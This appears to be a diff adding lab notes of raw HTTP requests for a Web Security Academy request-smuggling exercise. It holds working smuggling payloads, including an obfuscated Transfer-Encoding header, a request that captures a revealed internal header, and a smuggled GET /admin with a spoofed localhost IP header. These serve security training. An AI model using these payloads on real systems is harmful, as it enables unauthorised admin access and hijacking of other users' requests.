@@ -1,0 +1,73 @@
+POST / HTTP/1.1
+Host: 0a5b0024034ba9b2c0193b98002a00a0.web-security-academy.net
+Cookie: session=wcaVpxy8NSub5MxKYFDcvqHWwlEZ6Seq
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 178
+Origin: https://0a5b0024034ba9b2c0193b98002a00a0.web-security-academy.net
+Referer: https://0a5b0024034ba9b2c0193b98002a00a0.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+tRANSFER-ENCODING: chunked
+
+3
+x=y
+0
+
+POST / HTTP/1.1
+Host: 0a5b0024034ba9b2c0193b98002a00a0.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 300
+
+search=
+
+
+
+
+
+
+
+
+
+-------------------------------------------------------------------------------------------
+after revealed header : 
+
+
+POST / HTTP/1.1
+Host: 0a5b0024034ba9b2c0193b98002a00a0.web-security-academy.net
+Cookie: session=wcaVpxy8NSub5MxKYFDcvqHWwlEZ6Seq
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 199
+Origin: https://0a5b0024034ba9b2c0193b98002a00a0.web-security-academy.net
+Referer: https://0a5b0024034ba9b2c0193b98002a00a0.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+tRANSFER-ENCODING: chunked
+
+3
+x=y
+0
+
+GET /admin HTTP/1.1
+Host: 0a5b0024034ba9b2c0193b98002a00a0.web-security-academy.net
+X-OgUCJf-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 300
+
